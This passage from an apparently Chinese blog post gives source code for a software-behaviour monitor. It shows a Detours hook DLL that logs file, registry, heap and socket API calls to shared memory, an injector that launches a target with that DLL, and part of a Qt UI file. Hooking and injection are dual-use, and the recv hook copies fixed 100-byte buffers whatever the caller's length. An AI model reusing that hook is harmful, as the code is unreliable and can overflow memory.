class="string">&quot;s&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info19.Name[<span class="number">1</span>], <span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info19.Name[<span class="number">2</span>], <span class="string">&quot;namelen&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info19.Name[<span class="number">3</span>], <span class="string">&quot;IP&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info19.Name[<span class="number">4</span>], <span class="string">&quot;port&quot;</span>);</span><br><span class="line">    <span class="comment">// 参数值</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info19.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, s);</span><br><span class="line">    <span class="built_in">sprintf</span>(info19.Value[<span class="number">1</span>], <span class="string">&quot;%08X&quot;</span>, name);</span><br><span class="line">    <span class="built_in">sprintf</span>(info19.Value[<span class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, namelen);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span>* <span class="title">sock</span> =</span> (struct sockaddr_in*)name;</span><br><span class="line">    <span class="keyword">int</span> port = <span class="built_in">ntohs</span>(sock-&gt;sin_port);</span><br><span class="line">    <span class="built_in">sprintf</span>(info19.Value[<span class="number">3</span>], <span class="string">&quot;%s&quot;</span>, <span class="built_in">inet_ntoa</span>(sock-&gt;sin_addr));</span><br><span class="line">    <span class="built_in">sprintf</span>(info19.Value[<span class="number">4</span>], <span class="string">&quot;%d&quot;</span>, port);</span><br><span class="line">    info19.type = CONNECT;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info19.st));</span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info19, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    info19.Num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Oldconnect</span>(s, name, namelen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(WINAPI* Oldrecv)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    SOCKET     s,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">char</span>* buf,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span>        len,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span>        flags</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= recv;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function"><span class="keyword">int</span> WINAPI <span class="title">Newrecv</span><span class="params">(SOCKET s, <span class="keyword">char</span>* buf, <span class="keyword">int</span> len, <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line">    info info20;</span><br><span class="line">    info20.Num = <span class="number">5</span>;</span><br><span class="line">    <span class="comment">//截获收到的数据，再将原先存储收到数据的地方赋值</span></span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(buffer));</span><br><span class="line">    <span class="keyword">int</span> x=<span class="built_in">Oldrecv</span>(s, buffer, len, flags);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, buffer, <span class="built_in"><span class="keyword">sizeof</span></span>(buffer));</span><br><span class="line">    <span class="comment">// 参数名</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info20.Name[<span class="number">0</span>], <span class="string">&quot;s&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info20.Name[<span class="number">1</span>], <span class="string">&quot;buf&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info20.Name[<span class="number">2</span>], <span class="string">&quot;len&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info20.Name[<span class="number">3</span>], <span class="string">&quot;flags&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info20.Name[<span class="number">4</span>], <span class="string">&quot;接收数据&quot;</span>);</span><br><span class="line">    <span class="comment">// 参数值</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info20.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, s);</span><br><span class="line">    <span class="built_in">sprintf</span>(info20.Value[<span class="number">1</span>], <span class="string">&quot;%08X&quot;</span>,buf);</span><br><span class="line">    <span class="built_in">sprintf</span>(info20.Value[<span class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, len);</span><br><span class="line">    <span class="built_in">sprintf</span>(info20.Value[<span class="number">3</span>], <span class="string">&quot;%08X&quot;</span>, flags);</span><br><span class="line">    <span class="built_in">sprintf</span>(info20.Value[<span class="number">4</span>], <span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    info20.type = RECV;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info20.st));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*FILE* f = fopen(&quot;test.txt&quot;, &quot;a+&quot;);</span></span><br><span class="line"><span class="comment">    fprintf(f, &quot;接收数据:%s\nsendinfo中：%s&quot;,buf,info20.Value[1]);</span></span><br><span class="line"><span class="comment">    fclose(f);*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info20, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    info20.Num = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//return Oldrecv(s, buf, len, flags);</span></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">BOOL</span> <span class="params">(WINAPI* OldCopyFileA)</span><span class="params">(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists)</span> </span>= CopyFileA;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function">BOOL WINAPI <span class="title">NewCopyFileA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpExistingFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpNewFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">    BOOL bFailIfExists</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span>&#123;</span><br><span class="line">    info info21;</span><br><span class="line">    info21.Num = <span class="number">3</span>;</span><br><span class="line">    info21.type = COPYFILEA;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info21.st));</span><br><span class="line">    <span class="built_in">sprintf</span>(info21.Name[<span class="number">0</span>], <span class="string">&quot;原文件名&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info21.Name[<span class="number">1</span>], <span class="string">&quot;目的文件名&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info21.Name[<span class="number">2</span>], <span class="string">&quot;bfailIfExists&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info21.Value[<span class="number">0</span>], <span class="string">&quot;%s&quot;</span>, lpExistingFileName);</span><br><span class="line">    <span class="built_in">sprintf</span>(info21.Value[<span class="number">1</span>], <span class="string">&quot;%s&quot;</span>, lpNewFileName);</span><br><span class="line">    <span class="built_in">sprintf</span>(info21.Value[<span class="number">2</span>], <span class="string">&quot;%d&quot;</span>, bFailIfExists);</span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info21, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    info21.Num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldCopyFileA</span>(lpExistingFileName, lpNewFileName, bFailIfExists);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">DisableThreadLibraryCalls</span>(hModule);</span><br><span class="line">        <span class="built_in">DetourTransactionBegin</span>();</span><br><span class="line">        <span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldMessageBoxA, NewMessageBoxA);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldMessageBoxW, NewMessageBoxW);<span class="comment">//进行链接</span></span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldCreateFile, NewCreateFile);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldWriteFile, NewWriteFile);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldReadFile, NewReadFile);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldCloseHandle, NewCloseHandle);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldHeapCreate, NewHeapCreate);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldHeapDestroy, NewHeapDestroy);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldHeapFree, NewHeapFree);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldHeapAlloc, NewHeapAlloc);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldRegCreateKeyEx, NewRegCreateKeyEx);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldRegSetValueEx, NewRegSetValueEx);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldRegDeleteValue, NewRegDeleteValue);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldRegCloseKey, NewRegCloseKey);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldRegOpenKeyEx, NewRegOpenKeyEx);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)Oldsocket, Newsocket);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)Oldbind, Newbind);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)Oldconnect, Newconnect);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)Oldsend, Newsend);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)Oldrecv, Newrecv);</span><br><span class="line">        <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldCopyFileA, NewCopyFileA);</span><br><span class="line">        <span class="built_in">DetourTransactionCommit</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH: </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="built_in">DetourTransactionBegin</span>();</span><br><span class="line">        <span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldMessageBoxA, NewMessageBoxA);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldMessageBoxW, NewMessageBoxW);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldCreateFile, NewCreateFile);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldWriteFile, NewWriteFile);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldReadFile, NewReadFile);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldCloseHandle, NewCloseHandle);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldHeapCreate, NewHeapCreate);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldHeapDestroy, NewHeapDestroy);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldHeapFree, NewHeapFree);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldHeapAlloc, NewHeapAlloc);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldRegCreateKeyEx, NewRegCreateKeyEx);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldRegSetValueEx, NewRegSetValueEx);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldRegDeleteValue, NewRegDeleteValue);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldRegCloseKey, NewRegCloseKey);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldRegOpenKeyEx, NewRegOpenKeyEx);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)Oldsocket, Newsocket);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)Oldbind, Newbind);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)Oldconnect, Newconnect);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)Oldsend, Newsend);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)Oldrecv, Newrecv);</span><br><span class="line">        <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)OldCopyFileA, NewCopyFileA);</span><br><span class="line">        <span class="built_in">DetourTransactionCommit</span>();</span><br><span class="line">        <span class="built_in">UnmapViewOfFile</span>(lpBase);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hMapFile);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="注射器程序"><a class="markdownIt-Anchor" href="#注射器程序"></a> 注射器程序</h3>
<p>注意代码中的路径。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// App.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// std::cout &lt;&lt; &quot;Hello World!\n&quot;;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strstr</span>(argv[<span class="number">0</span>], <span class="string">&quot;App&quot;</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">wchar_t</span> fileName[<span class="number">256</span>] = <span class="string">L&quot;&quot;</span>;</span><br><span class="line">	<span class="built_in">MultiByteToWideChar</span>(CP_ACP, <span class="number">0</span>, argv[<span class="number">0</span>], <span class="built_in">strlen</span>(argv[<span class="number">0</span>]), fileName, <span class="built_in"><span class="keyword">sizeof</span></span>(fileName));</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;%s\n&quot;</span>, fileName);</span><br><span class="line"></span><br><span class="line">	STARTUPINFO si;</span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in"><span class="keyword">sizeof</span></span>(STARTUPINFO));</span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESS_INFORMATION));</span><br><span class="line">	si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(STARTUPINFO);</span><br><span class="line">	WCHAR DirPath[MAX_PATH + <span class="number">1</span>];</span><br><span class="line">	<span class="comment">/*wcscpy_s(DirPath, MAX_PATH, L&quot;C:\\Users\\15242\\source\\repos\\SoftWareScan\\Debug&quot;);*/</span></span><br><span class="line">	<span class="built_in">wcscpy_s</span>(DirPath, MAX_PATH, <span class="string">L&quot;./&quot;</span>);</span><br><span class="line">	<span class="comment">/*char DLLPath[MAX_PATH + 1] = &quot;C:\\Users\\15242\\source\\repos\\SoftWareScan\\Debug\\Dll1.dll&quot;;*/</span></span><br><span class="line">	<span class="keyword">char</span> DLLPath[MAX_PATH + <span class="number">1</span>] = <span class="string">&quot;Dll1.dll&quot;</span>;</span><br><span class="line">	WCHAR EXE[MAX_PATH + <span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//wcscpy_s(EXE, MAX_PATH, L&quot;C:\\Users\\15242\\Documents\\Tencent Files\\1524276984\\FileRecv\\TestInitialNullForStudent\\TestApp\\Debug\\TestApp.exe&quot;);</span></span><br><span class="line">	<span class="built_in">wcscpy_s</span>(EXE, MAX_PATH, fileName);</span><br><span class="line"></span><br><span class="line">	std::cout &lt;&lt; fileName &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">DetourCreateProcessWithDllEx</span>(EXE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_DEFAULT_ERROR_MODE | CREATE_SUSPENDED, <span class="literal">NULL</span>, DirPath, &amp;si, &amp;pi, DLLPath, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line">		<span class="built_in">WaitForSingleObject</span>(pi.hProcess, INFINITE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> error[<span class="number">100</span>];</span><br><span class="line">		<span class="built_in">sprintf</span>(error, <span class="string">&quot;%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="主程序softwarescan"><a class="markdownIt-Anchor" href="#主程序softwarescan"></a> 主程序SoftWareScan</h3>
<p>界面<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>U</mi><mi>I</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;UI\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>文件<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>S</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>W</mi><mi>a</mi><mi>r</mi><mi>e</mi><mi>S</mi><mi>c</mi><mi>a</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>u</mi><mi>i</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;SoftWareScan.ui\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord">.</span><span class="mord mathdefault">u</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>:</p>
<p>该程序利用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>V</mi><mi>S</mi><mn>2019</mn><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;VS2019\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord">2</span><span class="mord">0</span><span class="mord">1</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>中的可视化操作界面生成部分UI组件，因此该文件由<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>Q</mi><mi>t</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;Qt\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">Q</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>自动生成。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ui</span> <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">class</span>&gt;</span>SoftWareScanClass<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;SoftWareScanClass&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">x</span>&gt;</span>0<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">y</span>&gt;</span>0<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">width</span>&gt;</span>1123<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">height</span>&gt;</span>799<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cursor&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">cursorShape</span>&gt;</span>PointingHandCursor<span class="tag">&lt;/<span class="name">cursorShape</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;mouseTracking&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bool</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;windowTitle&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">string</span>&gt;</span>SoftWareScan<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;windowIcon&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">iconset</span> <span class="attr">resource</span>=<span class="string">&quot;SoftWareScan.qrc&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">normaloff</span>&gt;</span>:/SoftWareScan/Resources/SoftWareScan.png<span class="tag">&lt;/<span class="name">normaloff</span>&gt;</span>:/SoftWareScan/Resources/SoftWareScan.png<span class="tag">&lt;/<span class="name">iconset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;autoFillBackground&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bool</span>&gt;</span>false<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;InfoWidget&quot;</span> <span class="attr">native</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">x</span>&gt;</span>0<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">y</span>&gt;</span>0<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">width</span>&gt;</span>591<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">height</span>&gt;</span>281<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;styleSheet&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">notr</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QTextBrowser&quot;</span> <span class="attr">name</span>=<span class="string">&quot;FilePathShow&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">x</span>&gt;</span>0<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">y</span>&gt;</span>20<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">width</span>&gt;</span>591<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">height</span>&gt;</span>41<span class="tag">&lt;/<span 